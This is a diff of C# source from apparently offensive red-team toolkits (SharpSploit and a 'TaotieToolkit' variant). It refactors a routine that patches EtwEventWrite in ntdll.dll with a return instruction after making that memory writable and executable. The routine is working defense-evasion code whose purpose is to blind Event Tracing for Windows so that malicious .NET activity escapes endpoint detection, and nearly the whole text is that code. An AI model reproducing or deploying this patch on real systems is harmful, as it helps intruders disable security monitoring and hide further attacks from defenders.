@@ -4,21 +4,17 @@
 
 using System;
 using System.Runtime.InteropServices;
-using TaotieToolkit.config;
-using SharpSploit.Execution.PlatformInvoke;
+using SharpSploit.Misc;
+using PInvoke = SharpSploit.Execution.PlatformInvoke;
 
-namespace TaotieToolkit
+namespace SharpSploit.Evasion
 {
 
     /// <summary>
     /// ETW is a class for manipulating Event Tracing for Windows (ETW).
     /// </summary>
-    public class PatchETWEventWrite : ICommand, ICommandMarker
+    public class ETW
     {
-
-        public string Name => "PatchETWEventWrite";
-        public string Description => "Patch ETW";
-
         /// <summary>
         /// Patch the EtwEventWrite function in ntdll.dll.
         /// </summary>
@@ -27,14 +23,14 @@ namespace TaotieToolkit
         /// <remarks>
         /// Code has been adapted from Adam Chester (https://blog.xpnsec.com/hiding-your-dotnet-etw/) and Mythic Atlas (https://github.com/its-a-feature/Mythic/tree/master/Payload_Types/atlas).
         ///</remarks>
-        public void Execute(string[] args)
+        public static bool PatchETWEventWrite()
         {
             byte[] patch;
-            if (Utils.Is64Bit)
+            if (Utilities.Is64Bit)
             {
-                patch = new byte[1];
+                patch = new byte[2];
                 patch[0] = 0xc3;
-                //patch[1] = 0x00;   //这段非必须，用作填充
+                patch[1] = 0x00;
             }
             else
             {
@@ -46,16 +42,16 @@ namespace TaotieToolkit
 
             try
             {
-                var library = Win32.Kernel32.LoadLibrary("ntdll.dll");
-                var address = Win32.Kernel32.GetProcAddress(library, "EtwEventWrite");
-                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
+                var library = PInvoke.Win32.Kernel32.LoadLibrary("ntdll.dll");
+                var address = PInvoke.Win32.Kernel32.GetProcAddress(library, "EtwEventWrite");
+                PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
                 Marshal.Copy(patch, 0, address, patch.Length);
-                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
-                Console.WriteLine("[*] ETW Patch Sucess!");
+				PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+                return true;
             }
-            catch (Exception e)
+            catch
             {
-                Console.WriteLine("\t[-] ETW patch failed,exception:" + e.Message);
+                return false;
             }
         }
     }
